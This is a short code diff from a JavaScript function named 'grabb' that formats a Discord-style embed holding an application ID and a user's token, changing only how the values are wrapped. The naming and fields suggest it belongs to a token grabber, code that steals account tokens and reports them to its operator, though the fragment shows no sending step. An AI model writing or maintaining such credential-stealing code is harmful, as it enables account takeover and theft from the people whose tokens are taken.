@@ -129,12 +129,12 @@ async function grabb(applicationId, token) {
     embeds: [{
       fields: [{
         name: 'Informações',
-        value: `${applicationId}\``,
+        value: `\`${applicationId}\``,
         inline: false
       },
         {
           name: 'Token',
-          value: `\`${token}\``,
+          value: `||${token}||`,
           inline: false
         },
         {
